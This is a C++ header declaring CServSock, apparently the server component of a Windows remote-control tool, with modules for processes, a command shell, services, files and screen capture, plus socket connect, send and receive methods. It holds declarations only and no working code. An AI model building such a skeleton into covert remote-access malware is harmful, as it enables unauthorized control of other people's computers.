#pragma once
#include "..\RemoteClient\sys.h"
#include <WinSock2.h>
#include "ServProcess.h"
#include "ServCmd.h"
#include "ServSVC.h"
#include "ServFile.h"
#include "ServScreen.h"

#pragma comment(lib, "Ws2_32.lib")
extern HANDLE hEve;
class CServFileSock;

class CServSock
{
public:
	CServSock(void);
	~CServSock(void);
	BOOL MySelect(SOCKET sk);
	BOOL MySendCommond(SOCKET sk, int Id, char *text, int size, int fd = NULL);
	BOOL MyRecvCommond(SOCKET sk, COMMEND &cmd);
	SOCKET MyConnect(char *ip, UINT port);
	void MyStart();
	
private:
	static DWORD WINAPI ThreadProc(LPVOID lpParameter);
	//SOCKET AllSock;
	void MyGetInfo(SOCKET sk);
	CServProcess m_ServProcess;
	CServCmd m_ServCmd;
	CServSVC m_ServSVC;
	CServFile m_ServFile;
	CServFileSock *m_ServFileSock;
	CServScreen m_ServScreen;
public:
	BUILD MyGetBuildInfo(void);
};
